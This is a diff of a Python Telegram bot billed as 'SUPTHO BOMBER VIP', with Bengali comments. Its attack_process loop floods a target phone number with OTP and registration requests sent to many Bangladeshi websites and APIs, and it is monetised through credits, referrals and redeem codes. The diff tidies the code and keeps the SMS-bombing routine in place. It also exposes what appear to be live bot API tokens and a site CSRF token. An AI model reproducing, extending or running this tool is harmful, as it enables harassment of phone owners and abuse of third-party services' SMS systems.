@@ -6,17 +6,18 @@ import json
 import random
 import string
 import os
+import html
 from flask import Flask
 from telebot import types
 
 # ==========================================
 # 🔧 CONFIGURATION (SETTINGS)
 # ==========================================
-API_TOKEN = '8577991344:AAHZVqL_RxVGZ9eSlMoOheYtR2JDZtRsHiM'   # <--- Ekhane Bot Token din
-OWNER_ID = 6941003064               # <--- Apnar nijer Telegram ID (Number) din
-OWNER_USERNAME = "Suptho1"          # <--- Admin Username (@ chara)
+API_TOKEN = '8577991344:AAGdkMNIt1v-bSBgsQKQSjGOtaklWAYn5NI'   # <--- Bot Token দিন
+OWNER_ID = 6941003064               # <--- আপনার Telegram ID (Number)
+OWNER_USERNAME = "@Suptho1"          # <--- Admin Username
 CHANNEL_ID = "@SH_tricks"           # <--- Channel Username
-VERSION = "12.0 (Ultra VIP)"
+VERSION = "5.0(Vip)"
 
 bot = telebot.TeleBot(API_TOKEN)
 DATA_FILE = 'data.json'
@@ -43,8 +44,15 @@ db = load_data()
 app = Flask('')
 @app.route('/')
 def home(): return "Bot is Running Successfully!"
-def run_web_server(): app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
-def keep_alive(): threading.Thread(target=run_web_server, daemon=True).start()
+
+def run_web_server():
+    port = int(os.environ.get("PORT", 10000))
+    app.run(host='0.0.0.0', port=port)
+
+def keep_alive():
+    t = threading.Thread(target=run_web_server)
+    t.daemon = True
+    t.start()
 
 # ==========================================
 # 🛡️ HELPER FUNCTIONS
@@ -76,8 +84,8 @@ def attack_process(target, call_id):
     global stop_flags
     stop_flags[call_id] = False
     
-    # Loop cholbe jotokkhon na stop kora hoy
     while not stop_flags.get(call_id, False):
+        # 27+ APIs Here
         api_hit("https://api.apex4u.com/api/auth/login", "POST", json={"phoneNumber": target})
         api_hit("https://shopbasebd.com/store/registration/sendOTP", "POST", data={"number": target, "_token": "ktrqcmKSAn8cP3vZvw3xkbav2ww65eRvaikWKDFo"})
         api_hit(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={target}", "GET")
@@ -105,7 +113,7 @@ def attack_process(target, call_id):
         api_hit("https://app.eonbazar.com/api/auth/register", "POST", json={"mobile": target})
         api_hit("https://tracking.sundarbancourierltd.com/PreBooking/SendPin", "POST", json={"PreBookingRegistrationPhoneNumber": target})
         
-        time.sleep(1) # Delay to prevent blocking
+        time.sleep(1)
 
 # ==========================================
 # 🤖 MAIN MENU & BUTTONS
@@ -121,24 +129,25 @@ def welcome(message):
             referrer = message.text.split()[1]
             if referrer != user_id and referrer in db['users']:
                 db['users'][referrer]['credits'] += 5
-                try: bot.send_message(referrer, "🎉 New Referral! You got +5 Credits.") except: pass
+                try:
+                    bot.send_message(referrer, "🎉 New Referral! You got +5 Credits.")
+                except:
+                    pass
         
         # New User Bonus
         db['users'][user_id] = {"credits": 5, "joined": time.time(), "ref_by": referrer}
         save_data(db)
 
-    # 2. Main Menu Buttons (Reply Keyboard)
+    # 2. Main Menu Buttons
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
-    btn1 = types.KeyboardButton("🚀 Start Bomb")
-    btn2 = types.KeyboardButton("👥 Refer to Earn")
-    btn3 = types.KeyboardButton("💰 Redeem Credit")
-    btn4 = types.KeyboardButton("👑 Admin") # Direct Link Possible Na Reply te, tai Logic use hobe
-    
-    markup.add(btn1)
-    markup.add(btn2, btn3)
-    markup.add(btn4)
+    markup.add(types.KeyboardButton("🚀 Start Bomb"))
+    markup.add(types.KeyboardButton("👥 Refer to Earn"), types.KeyboardButton("💰 Redeem Credit"))
+    markup.add(types.KeyboardButton("👑 Admin"))
 
-    text = f"🔥 <b>SUPTHO BOMBER VIP</b> 🔥\n\n👋 Welcome, <b>{message.from_user.first_name}</b>\n💳 Balance: <b>{db['users'][user_id]['credits']} Credits</b>\n\n👇 Select an option from below:"
+    # Name escaping added to prevent "Bad Request" error
+    safe_name = html.escape(message.from_user.first_name)
+    
+    text = f"🔥 <b>SUPTHO BOMBER VIP</b> 🔥\n\n👋 Welcome, <b>{safe_name}</b>\n💳 Balance: <b>{db['users'][user_id]['credits']} Credits</b>\n\n👇 Select an option from below:"
     
     bot.send_message(message.chat.id, text, parse_mode='HTML', reply_markup=markup)
 
@@ -185,7 +194,12 @@ def process_bombing(message):
 @bot.message_handler(func=lambda message: message.text == "👥 Refer to Earn")
 def refer_handler(message):
     user_id = str(message.from_user.id)
-    link = f"https://t.me/{bot.get_me().username}?start={user_id}"
+    try:
+        bot_username = bot.get_me().username
+    except:
+        bot_username = "YOUR_BOT_USERNAME" # Fallback if get_me fails
+        
+    link = f"https://t.me/{bot_username}?start={user_id}"
     text = f"🎁 <b>Refer & Earn</b>\n\nShare this link to your friends. If they start the bot, you get <b>+5 Credits</b>.\n\n🔗 <b>Your Link:</b>\n<code>{link}</code>"
     bot.reply_to(message, text, parse_mode='HTML')
 
@@ -246,7 +260,12 @@ def admin_commands(message):
 
         # Code Generator
         elif cmd == '/gencodes':
-            amount = int(args[1])
+            try:
+                amount = int(args[1])
+            except:
+                bot.reply_to(message, "❌ Format: /gencodes 10")
+                return
+
             new_codes = ["SUP-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6)) for _ in range(amount)]
             db['codes'].extend(new_codes)
             save_data(db)
@@ -284,7 +303,7 @@ def admin_commands(message):
                 save_data(db)
                 bot.reply_to(message, f"✅ User {uid} has been UNBANNED.")
 
-        # Whitelist (Protect Number)
+        # Whitelist
         elif cmd == '/white':
             num = args[1]
             if num not in db['whitelist']:
@@ -307,8 +326,11 @@ def admin_commands(message):
 # 🔥 RUNNER
 # ==========================================
 if __name__ == "__main__":
-    try: bot.remove_webhook()
-    except: pass
+    try:
+        bot.remove_webhook()
+    except:
+        pass
+    
     keep_alive()
-    print("✅ Ultimate Bot Started...")
+    print("✅ Bot Running...")
     bot.polling(non_stop=True)
